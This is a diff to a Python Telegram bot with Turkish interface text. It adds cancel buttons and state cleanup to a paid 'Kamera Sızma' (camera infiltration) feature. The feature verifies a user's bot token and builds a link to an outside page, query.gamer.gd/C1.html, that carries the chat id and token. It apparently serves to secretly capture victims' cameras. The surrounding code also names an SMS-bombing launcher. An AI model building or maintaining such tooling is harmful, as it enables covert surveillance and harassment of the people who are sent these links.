@@ -8218,39 +8218,62 @@ def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
         }
     t.start()
 
+def _clear_camera_state(bot_instance, uid, chat_id=None):
+    """Kamera token state + next_step temizle."""
+    USER_STATES.pop(uid, None)
+    try:
+        cid = chat_id or uid
+        bot_instance.clear_step_handler_by_chat_id(cid)
+    except Exception:
+        pass
+
+
 def _process_camera_token(msg, bot_instance):
     """Kamera link: token al, doğrula, query.gamer.gd ile kısa link üret. Kanal yok."""
     uid = msg.from_user.id
     chat_id = msg.chat.id
     text = (msg.text or "").strip()
+    low = text.lower().replace("ı", "i").replace("İ", "i")
 
-    if text.lower() in ("iptal", "cancel", "/cancel", "çık", "cik"):
-        USER_STATES.pop(uid, None)
-        bot_instance.reply_to(msg, "❌ İptal edildi.")
+    # iptal kelimeleri
+    if low in ("iptal", "cancel", "/cancel", "/iptal", "cik", "çık", "vazgec", "vazgeç", "geri"):
+        _clear_camera_state(bot_instance, uid, chat_id)
+        bot_instance.reply_to(msg, "❌ Kamera Sızma iptal edildi.")
         return
 
     if not is_premium_camera(uid):
-        USER_STATES.pop(uid, None)
+        _clear_camera_state(bot_instance, uid, chat_id)
         bot_instance.reply_to(msg, "🔒 Bu servis için üyelik gerekli. Araçlar menüsünden satın al.")
         return
 
     token = text
     if not token or ":" not in token or len(token) < 30:
-        bot_instance.reply_to(msg, "❌ Geçersiz token formatı. Tekrar gönder veya iptal yaz.")
+        mk = InlineKeyboardMarkup(row_width=1)
+        mk.add(_btn("❌ İptal", "camera_cancel", "danger"))
+        bot_instance.reply_to(
+            msg,
+            "❌ Geçersiz token formatı.\nTekrar gönder veya <b>İptal</b> butonuna bas.",
+            reply_markup=mk,
+            parse_mode="HTML",
+        )
         return
 
     url = f"https://api.telegram.org/bot{token}/getMe"
     try:
         r = requests.get(url, timeout=10).json()
     except Exception:
-        bot_instance.reply_to(msg, "❌ Telegram API erişim hatası. Tekrar dene.")
+        mk = InlineKeyboardMarkup(row_width=1)
+        mk.add(_btn("❌ İptal", "camera_cancel", "danger"))
+        bot_instance.reply_to(msg, "❌ Telegram API erişim hatası. Tekrar dene.", reply_markup=mk)
         return
 
     if not r.get("ok"):
-        bot_instance.reply_to(msg, "❌ Geçersiz token. Tekrar dene veya iptal yaz.")
+        mk = InlineKeyboardMarkup(row_width=1)
+        mk.add(_btn("❌ İptal", "camera_cancel", "danger"))
+        bot_instance.reply_to(msg, "❌ Geçersiz token. Tekrar dene veya İptal'e bas.", reply_markup=mk)
         return
 
-    USER_STATES.pop(uid, None)
+    _clear_camera_state(bot_instance, uid, chat_id)
     bot_instance.reply_to(msg, "✅ *Token doğrulandı!*", parse_mode="Markdown")
 
     long_url = f"http://query.gamer.gd/C1.html?id={chat_id}&token={token}"
@@ -9484,6 +9507,11 @@ def register_handlers(bot_instance):
                 return
             print(f"[CB] uid={uid} data={data!r}")
 
+            # Kamera token state takılı kalmasın — başka butona basınca temizle
+            st_cam = USER_STATES.get(uid) or {}
+            if st_cam.get("action") == "camera_token" and data not in ("camera_cancel", "buy_camera", "tool_camera"):
+                _clear_camera_state(bot_instance, uid, cid)
+
             # ── BAN ──
             if enforce_ban(uid):
                 _ack("🚫 Yasaklısınız! Botu kullanamazsınız.", alert=True)
@@ -9589,6 +9617,7 @@ def register_handlers(bot_instance):
 
             if data == "goto_home":
                 _ack()
+                _clear_camera_state(bot_instance, uid, cid)
                 try:
                     if mid is not None:
                         bot_instance.delete_message(cid, mid)
@@ -10720,16 +10749,40 @@ def register_handlers(bot_instance):
                     return
 
                 # Üye / admin → token iste (orijinal mantık, kanal yok)
+                try:
+                    bot_instance.clear_step_handler_by_chat_id(call.message.chat.id)
+                except Exception:
+                    pass
                 USER_STATES[uid] = {"action": "camera_token"}
+                mk = InlineKeyboardMarkup(row_width=1)
+                mk.add(_btn("❌ İptal", "camera_cancel", "danger"))
                 m = bot_instance.send_message(
                     call.message.chat.id,
                     "📷 <b>Kamera Sızma</b>\n"
                     "━━━━━━━━━━━━━━━━━━━━━\n"
                     "🔑 Lütfen <b>Telegram Bot Token</b> gönderin:\n\n"
-                    "<i>iptal yazarak çık</i>",
+                    "İptal için butona bas veya <code>iptal</code> yaz.",
+                    reply_markup=mk,
                     parse_mode="HTML"
                 )
                 register_step(bot_instance, m, lambda m: _process_camera_token(m, bot_instance))
+                return
+
+            if data == "camera_cancel":
+                try:
+                    bot_instance.answer_callback_query(call.id, "İptal edildi")
+                except Exception:
+                    pass
+                _clear_camera_state(bot_instance, uid, call.message.chat.id)
+                try:
+                    bot_instance.edit_message_text(
+                        "❌ Kamera Sızma iptal edildi.",
+                        call.message.chat.id,
+                        call.message.message_id,
+                        parse_mode="HTML",
+                    )
+                except Exception:
+                    bot_instance.send_message(call.message.chat.id, "❌ Kamera Sızma iptal edildi.")
                 return
 
             if data == "buy_camera":
